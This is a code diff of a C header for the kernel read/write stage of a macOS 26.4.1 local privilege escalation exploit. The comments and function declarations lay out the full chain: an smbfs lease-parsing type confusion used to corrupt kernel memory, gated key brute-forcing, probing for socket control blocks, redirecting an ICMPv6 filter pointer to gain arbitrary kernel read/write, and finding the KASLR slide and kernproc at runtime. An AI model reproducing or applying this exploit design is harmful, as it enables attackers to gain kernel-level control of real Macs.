@@ -1,24 +1,29 @@
 /*
  * krw.h -- stage-2 kernel R/W for the Blazakis/Calif macOS 26.4.1 LPE.
  *
- * Primitive chain (all offsets in offsets.h, verified against the KDK
- * 25E253 t6050 DWARF and the 25E253 smbfs/webdav kext disassembly):
+ * Primitive chain (all offsets in offsets.h, verified against the 25E253
+ * smbfs/webdav kext disassembly):
  *
  *   corrupt(T, val32, epoch16, key_hi, key_low)
  *     via the smbfs RqLs type confusion with K = T - 0x2c:
  *       *(u32*)(T)      = val32          (lease_state @ K+0x2c)
- *       *(u16*)(K+0x50) = epoch16        (v2 lease epoch)
- *       *(u64*)(K+0x20)|= 0x80           (SMB2_LEASE_GRANTED side effect)
+ *       *(u16*)(K+0x50) = epoch16        (v2 lease epoch -- we use v1, none)
  *       *(u64*)(K+0x10) = *(u64*)(K+0x18) = 0   (lease unlock side effect)
  *     gates: *(u64*)(K+8) == 0, *(u64*)(K+0x30) == key_hi,
  *            *(u64*)(K+0x38) == key_low.  On key mismatch the parser bails
- *     with EBADRPC after lock/unlock (no lasting damage) -> safe to brute.
+ *     with EBADRPC after lock/unlock (no lasting damage) -> safe to brute,
+ *     PROVIDED the mutex word at K+0 looks like a free mutex (== 0) and the
+ *     keys are distinctive enough that dead/zeroed memory cannot match.
  *
- *   probe:  T = P + 0x154 (inp6_hops) -> getsockopt(fd, IPV6_UNICAST_HOPS)
- *           reveals which of our sockets owns inpcb P.
- *           keys: u64@(P+0x158) = hash_element (0 for ripcb), u64@(P+0x160)
- *                 = saved_ppcb (0).  All known-by-construction.
- *           side effect: P+0x148 (filt ptr) |= 0x80 -> repaired post-R/W.
+ *   probe:  K = P + 0x120, so the keys are u64@(P+0x150) = cksum|hops<<32
+ *           (0xffffffff | 0x41<<32 -- distinctive: default hops is 64, only
+ *           our identity sockets use 0x41) and u64@(P+0x158) = hash_element
+ *           (0 for ripcb).  The write lands on the filt pointer high half
+ *           (P+0x14c = 0): a hit makes getsockopt(fd, ICMP6_FILTER) fail
+ *           with EFAULT, which is how the matched socket is identified.
+ *           Freed/zeroed slots and other processes' sockets never match
+ *           the keys, so misses cause no writes (the 25E253 panic we hit
+ *           came from zero keys matching freed memory).
  *
  *   redirect: two corrupt() writes set A.in6p_icmp6filt = &B.in6p_icmp6filt
  *           (B+0x148).  Then setsockopt(A, ICMP6_FILTER, buf32) writes 32
@@ -57,14 +62,18 @@ krw_t *krw_open(const char *corrupt_bin, const char *server_url,
 int krw_corrupt_u32(krw_t *k, uint64_t T, uint32_t val, uint16_t epoch,
                     uint64_t key_hi, uint64_t key_low);
 
-/* Identity socket set: open n ICMPv6 dgram sockets, tag each with a unique
- * hop-limit marker starting at hops_base. Returns count opened. */
-int krw_identity_open(krw_t *k, int n, int hops_base);
+/* Identity socket set: open n ICMPv6 dgram sockets, all sharing the
+ * distinctive hop limit IDENT_HOPS (part of the probe key). */
+int krw_identity_open(krw_t *k, int n);
+void krw_identity_close(krw_t *k);
 
-/* Probe candidate inpcb address P: write marker at P+0x154, then scan the
- * identity set for a socket whose hop limit became `marker`.
+/* Probe candidate inpcb address P: confusion-write 0 to the filt pointer
+ * high half (P+0x14c) gated on keys u64@(P+0x150) = cksum|IDENT_HOPS<<32
+ * and u64@(P+0x158) = 0, then scan the identity set (skipping skip1/skip2)
+ * for a socket whose ICMP6_FILTER getsockopt now fails.
  * Returns the fd (>= 0) and sets *addr_out = P, or -1. */
-int krw_probe_inpcb(krw_t *k, uint64_t P, uint32_t marker, uint64_t *addr_out);
+int krw_probe_inpcb(krw_t *k, uint64_t P, int skip1, int skip2,
+                    uint64_t *addr_out);
 
 /* Establish the R/W window between identity sockets fdA (addr A) and
  * fdB (addr B).  Returns 0 on success (verified by reading through B). */
@@ -80,9 +89,17 @@ uint64_t krw_read64(krw_t *k, uint64_t addr);
 int krw_write64(krw_t *k, uint64_t addr, uint64_t val);
 uint32_t krw_read32u(krw_t *k, uint64_t addr);
 
-/* KASLR slide computed as read64(A+0x38) - XNU_RIPCBINFO (valid after
- * krw_redirect). */
+/* KASLR data slide, discovered at runtime by validating A.inp_pcbinfo
+ * against the ripcbinfo inpcb list (no static addresses needed).
+ * Valid after krw_redirect + krw_discover_slide. */
 uint64_t krw_slide(krw_t *k);
+int      krw_discover_slide(krw_t *k);
+
+/* Runtime _kernproc discovery: scan the kernelcache __DATA_CONST for the
+ * kernproc pointer (proc0: pid@+0x60 == 0, root ucred chain).  Needs the
+ * slide.  Result cached; accessor returns 0 until discovered. */
+int      krw_discover_kernproc(krw_t *k);
+uint64_t krw_kernproc(krw_t *k);
 
 /* Undo all confusion side effects so the process can exit without
  * panicking the kernel (filt/outputopts/moptions repairs). */
